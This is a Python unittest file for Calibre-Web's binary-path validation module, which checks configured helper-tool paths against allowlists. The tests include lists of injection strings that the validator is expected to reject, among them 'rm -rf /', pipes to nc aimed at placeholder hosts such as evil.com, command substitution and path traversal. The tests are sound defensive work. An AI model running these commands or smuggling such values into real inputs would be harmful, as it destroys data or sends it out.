# -*- coding: utf-8 -*-

#  This file is part of the Calibre-Web (https://github.com/janeczku/calibre-web)
#    Copyright (C) 2025 OzzieIsaacs
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program. If not, see <http://www.gnu.org/licenses/>.

import unittest
import os
import tempfile
import stat
import sys
from unittest.mock import patch, MagicMock

import importlib.util
import os
import sys

# Import exec_paths directly to avoid importing full cps package
# Ensure a minimal cps package stub exists to satisfy relative imports
import types
if 'cps' not in sys.modules:
    sys.modules['cps'] = types.ModuleType('cps')
if 'cps.exec_paths' in sys.modules:
    del sys.modules['cps.exec_paths']

EXEC_PATH = os.path.join(os.path.dirname(__file__), '..', 'cps', 'exec_paths.py')
spec = importlib.util.spec_from_file_location('cps.exec_paths', EXEC_PATH)
exec_paths = importlib.util.module_from_spec(spec)
sys.modules['cps.exec_paths'] = exec_paths
spec.loader.exec_module(exec_paths)


class TestBinaryValidation(unittest.TestCase):
    """Test suite for binary path validation functionality."""

    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.original_env = os.environ.get('CW_BINARY_WHITELIST', None)
    
    def tearDown(self):
        """Clean up test environment."""
        # Restore original environment
        if self.original_env is not None:
            os.environ['CW_BINARY_WHITELIST'] = self.original_env
        elif 'CW_BINARY_WHITELIST' in os.environ:
            del os.environ['CW_BINARY_WHITELIST']

    def test_normalize_path_valid_paths(self):
        """Test path normalization with valid paths."""
        # Test absolute path
        path = "/usr/bin/unrar"
        normalized = exec_paths.normalize_path(path)
        self.assertEqual(normalized, path)
        
        # Test relative path conversion
        with patch('os.path.abspath', return_value="/abs/path/binary"):
            normalized = exec_paths.normalize_path("relative/path")
            self.assertEqual(normalized, "/abs/path/binary")

    def test_normalize_path_dangerous_patterns(self):
        """Test path normalization rejects dangerous patterns."""
        dangerous_paths = [
            "/usr/bin/unrar; rm -rf /",  # Command injection
            "/usr/bin/unrar && malware",  # Command chaining
            "/usr/bin/unrar | nc evil.com 8080",  # Pipe
            "/usr/bin/unrar $(malicious)",  # Command substitution
            "/usr/bin/unrar `backdoor`",  # Backticks
            "/usr/bin/unrar\x00hidden",  # Null byte
            "/usr/bin/unrar\nmalware",  # Newline
            "/usr/bin/unrar\rmalware",  # Carriage return
            "/usr/bin/unrar --arg",  # Arguments (space + dash)
            "/usr/bin/unrar'quoted'",  # Single quotes
            '/usr/bin/unrar"quoted"',  # Double quotes
            "/usr/bin/unrar<input",  # Input redirection
            "/usr/bin/unrar>output",  # Output redirection
            "/usr/bin/unrar\\escape",  # Escape sequences
            "/usr/bin/unrar$VAR",  # Variable expansion
            "-usr/bin/unrar",  # Leading dash (argument)
        ]
        
        for dangerous_path in dangerous_paths:
            with self.subTest(path=dangerous_path):
                normalized = exec_paths.normalize_path(dangerous_path)
                self.assertIsNone(normalized, f"Path should be rejected: {dangerous_path}")

    def test_normalize_path_empty_invalid(self):
        """Test path normalization with empty/invalid inputs."""
        self.assertIsNone(exec_paths.normalize_path(""))
        self.assertIsNone(exec_paths.normalize_path(None))
        self.assertIsNone(exec_paths.normalize_path(123))

    def test_is_executable_file(self):
        """Test executable file detection."""
        # Create a test executable file
        test_file = os.path.join(self.temp_dir, "test_binary")
        with open(test_file, 'w') as f:
            f.write("#!/bin/bash\necho test\n")
        os.chmod(test_file, stat.S_IRWXU)
        
        self.assertTrue(exec_paths.is_executable_file(test_file))
        
        # Test non-executable file
        non_exec_file = os.path.join(self.temp_dir, "test_data")
        with open(non_exec_file, 'w') as f:
            f.write("data")
        os.chmod(non_exec_file, stat.S_IRUSR | stat.S_IWUSR)
        
        self.assertFalse(exec_paths.is_executable_file(non_exec_file))
        
        # Test non-existent file
        self.assertFalse(exec_paths.is_executable_file("/nonexistent/path"))

    @patch('cps.exec_paths.sys.platform', 'linux')
    def test_get_platform_allowlist_linux(self):
        """Test platform allowlist for Linux."""
        allowlist = exec_paths.get_platform_allowlist()
        self.assertIn('/usr/bin/unrar', allowlist)
        self.assertIn('/usr/local/bin/unrar', allowlist)
        self.assertIn('/opt/calibre/ebook-convert', allowlist)

    @patch('cps.exec_paths.sys.platform', 'darwin')
    def test_get_platform_allowlist_macos(self):
        """Test platform allowlist for macOS."""
        allowlist = exec_paths.get_platform_allowlist()
        self.assertIn('/usr/local/bin/unrar', allowlist)
        self.assertIn('/opt/homebrew/bin/unrar', allowlist)
        self.assertIn('/Applications/calibre.app/Contents/MacOS/ebook-convert', allowlist)

    @patch('cps.exec_paths.sys.platform', 'win32')
    def test_get_platform_allowlist_windows(self):
        """Test platform allowlist for Windows."""
        allowlist = exec_paths.get_platform_allowlist()
        self.assertIn(r'C:\Program Files\Calibre\ebook-convert.exe', allowlist)
        self.assertIn(r'C:\Program Files\WinRAR\UnRAR.exe', allowlist)

    def test_get_environment_allowlist(self):
        """Test environment variable allowlist."""
        # Test with valid paths
        test_paths = "/custom/path1,/custom/path2,/custom/path3"
        os.environ['CW_BINARY_WHITELIST'] = test_paths
        
        env_allowlist = exec_paths.get_environment_allowlist()
        expected_paths = {"/custom/path1", "/custom/path2", "/custom/path3"}
        
        # Convert to normalized absolute paths for comparison
        for path in expected_paths:
            self.assertIn(os.path.abspath(path), env_allowlist)

    def test_get_environment_allowlist_empty(self):
        """Test environment allowlist with empty value."""
        if 'CW_BINARY_WHITELIST' in os.environ:
            del os.environ['CW_BINARY_WHITELIST']
        
        env_allowlist = exec_paths.get_environment_allowlist()
        self.assertEqual(env_allowlist, set())

    def test_get_environment_allowlist_invalid_paths(self):
        """Test environment allowlist handles invalid paths gracefully."""
        # Test with some invalid paths mixed with valid ones
        test_paths = "/valid/path,,invalid\x00path,/another/valid"
        os.environ['CW_BINARY_WHITELIST'] = test_paths
        
        with patch('cps.exec_paths.log') as mock_log:
            env_allowlist = exec_paths.get_environment_allowlist()
            
            # Should contain valid paths
            self.assertIn(os.path.abspath("/valid/path"), env_allowlist)
            self.assertIn(os.path.abspath("/another/valid"), env_allowlist)
            
            # Should have logged warnings about invalid paths
            mock_log.warning.assert_called()

    @patch('cps.exec_paths.get_full_allowlist')
    @patch('cps.exec_paths.is_executable_file')
    @patch('cps.exec_paths.normalize_path')
    def test_validate_binary_path_success(self, mock_normalize, mock_executable, mock_allowlist):
        """Test successful binary path validation."""
        test_path = "/usr/bin/unrar"
        mock_normalize.return_value = test_path
        mock_allowlist.return_value = {test_path}
        mock_executable.return_value = True
        
        result = exec_paths.validate_binary_path(test_path)
        self.assertTrue(result)

    @patch('cps.exec_paths.get_full_allowlist')
    @patch('cps.exec_paths.is_executable_file')
    @patch('cps.exec_paths.normalize_path')
    def test_validate_binary_path_not_in_allowlist(self, mock_normalize, mock_executable, mock_allowlist):
        """Test binary path validation failure - not in allowlist."""
        test_path = "/malicious/binary"
        mock_normalize.return_value = test_path
        mock_allowlist.return_value = {"/usr/bin/unrar"}
        mock_executable.return_value = True
        
        result = exec_paths.validate_binary_path(test_path)
        self.assertFalse(result)

    @patch('cps.exec_paths.get_full_allowlist')
    @patch('cps.exec_paths.is_executable_file')
    @patch('cps.exec_paths.normalize_path')
    def test_validate_binary_path_not_executable(self, mock_normalize, mock_executable, mock_allowlist):
        """Test binary path validation failure - not executable."""
        test_path = "/usr/bin/unrar"
        mock_normalize.return_value = test_path
        mock_allowlist.return_value = {test_path}
        mock_executable.return_value = False
        
        result = exec_paths.validate_binary_path(test_path)
        self.assertFalse(result)

    @patch('cps.exec_paths.normalize_path')
    def test_validate_binary_path_invalid_path(self, mock_normalize):
        """Test binary path validation failure - invalid path."""
        mock_normalize.return_value = None
        
        result = exec_paths.validate_binary_path("/malicious; rm -rf /")
        self.assertFalse(result)

    def test_validate_binary_path_empty(self):
        """Test binary path validation with empty path."""
        result = exec_paths.validate_binary_path("")
        self.assertFalse(result)
        
        result = exec_paths.validate_binary_path(None)
        self.assertFalse(result)

    def test_get_binary_path_keys(self):
        """Test getting binary path configuration keys."""
        keys = exec_paths.get_binary_path_keys()
        expected_keys = [
            'config_rarfile_location',
            'config_binariesdir',
            'config_kepubifypath',
            'config_converterpath',
            'config_calibre',
        ]
        for key in expected_keys:
            self.assertIn(key, keys)

    def test_is_binary_path_key(self):
        """Test binary path key detection."""
        self.assertTrue(exec_paths.is_binary_path_key('config_rarfile_location'))
        self.assertTrue(exec_paths.is_binary_path_key('config_kepubifypath'))
        self.assertFalse(exec_paths.is_binary_path_key('config_port'))
        self.assertFalse(exec_paths.is_binary_path_key('mail_server'))

    @patch('cps.exec_paths.validate_binary_path')
    @patch('cps.exec_paths.normalize_path')
    @patch('os.path.isdir')
    def test_validate_calibre_binaries_dir_success(self, mock_isdir, mock_normalize, mock_validate):
        """Test successful Calibre binaries directory validation."""
        test_dir = "/opt/calibre"
        mock_normalize.return_value = test_dir
        mock_isdir.return_value = True
        mock_validate.return_value = True
        
        result = exec_paths.validate_calibre_binaries_dir(test_dir)
        self.assertTrue(result)

    @patch('cps.exec_paths.normalize_path')
    def test_validate_calibre_binaries_dir_invalid_dir(self, mock_normalize):
        """Test Calibre binaries directory validation with invalid directory."""
        mock_normalize.return_value = None
        
        result = exec_paths.validate_calibre_binaries_dir("/invalid/path")
        self.assertFalse(result)

    @patch('cps.exec_paths.validate_binary_path')
    @patch('cps.exec_paths.normalize_path')
    @patch('os.path.isdir')
    def test_validate_calibre_binaries_dir_missing_binary(self, mock_isdir, mock_normalize, mock_validate):
        """Test Calibre binaries directory validation with missing binary."""
        test_dir = "/opt/calibre"
        mock_normalize.return_value = test_dir
        mock_isdir.return_value = True
        # First binary validates, second doesn't
        mock_validate.side_effect = [True, False]
        
        result = exec_paths.validate_calibre_binaries_dir(test_dir)
        self.assertFalse(result)

    def test_symlink_attack_prevention(self):
        """Test prevention of symlink-based attacks."""
        # This test would be more comprehensive with actual symlink creation
        # but mocking demonstrates the protection
        with patch('cps.exec_paths.normalize_path') as mock_normalize:
            # Simulate symlink that resolves to dangerous location
            mock_normalize.return_value = "/tmp/malicious_binary"
            
            result = exec_paths.validate_binary_path("/legitimate/symlink")
            # Should fail because resolved path is not in allowlist
            self.assertFalse(result)

    def test_case_sensitivity_windows(self):
        """Test case sensitivity handling on Windows."""
        with patch('cps.exec_paths.sys.platform', 'win32'):
            with patch('os.path.normcase') as mock_normcase:
                mock_normcase.return_value = r'c:\program files\calibre\ebook-convert.exe'
                
                # Path normalization should handle case properly
                normalized = exec_paths.normalize_path(r'C:\Program Files\Calibre\ebook-convert.exe')
                self.assertIsNotNone(normalized)


class TestSecurityPatterns(unittest.TestCase):
    """Test security pattern detection in paths."""

    def test_command_injection_patterns(self):
        """Test detection of command injection patterns."""
        injection_attempts = [
            "binary; malicious_command",
            "binary && rm -rf /",
            "binary | nc attacker.com 8080",
            "binary $(dangerous)",
            "binary `backdoor`",
            "binary\x00hidden",
        ]
        
        for attempt in injection_attempts:
            with self.subTest(injection=attempt):
                result = exec_paths.validate_binary_path(attempt)
                self.assertFalse(result, f"Should reject injection attempt: {attempt}")

    def test_argument_injection_patterns(self):
        """Test detection of argument injection patterns."""
        arg_injection_attempts = [
            "binary --config=/tmp/evil.conf",
            "binary -o /tmp/output",
            " --help",
            "-version",
        ]
        
        for attempt in arg_injection_attempts:
            with self.subTest(injection=attempt):
                result = exec_paths.validate_binary_path(attempt)
                self.assertFalse(result, f"Should reject argument injection: {attempt}")

    def test_path_traversal_patterns(self):
        """Test detection of path traversal attempts."""
        traversal_attempts = [
            "../../../usr/bin/binary",
            "legitimate/../../../malicious",
            "/usr/bin/../../../tmp/evil",
        ]
        
        # These should be handled by path normalization
        for attempt in traversal_attempts:
            with self.subTest(traversal=attempt):
                # Path normalization should resolve these, but they still
                # won't be in the allowlist
                result = exec_paths.validate_binary_path(attempt)
                self.assertFalse(result)


if __name__ == '__main__':
    unittest.main()
